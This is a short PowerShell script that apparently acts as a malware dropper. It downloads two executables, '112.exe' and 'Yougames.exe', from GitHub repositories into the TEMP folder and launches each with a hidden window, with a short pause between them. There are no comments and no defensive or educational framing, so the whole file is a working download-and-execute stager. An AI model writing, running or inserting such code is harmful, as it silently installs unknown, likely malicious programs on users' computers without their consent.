
(New-Object Net.WebClient).DownloadFile('https://github.com/azru09ru-lang/xyuinya1/raw/refs/heads/main/112.exe', "$env:TEMP\112.exe");
Start-Process "$env:TEMP\112.exe" -WindowStyle Hidden


Start-Sleep -Seconds 4


(New-Object Net.WebClient).DownloadFile('https://github.com/azru09ru-lang/jar/raw/refs/heads/main/Yougames.exe', "$env:TEMP\Yougames.exe");
Start-Process "$env:TEMP\Yougames.exe" -WindowStyle Hidden
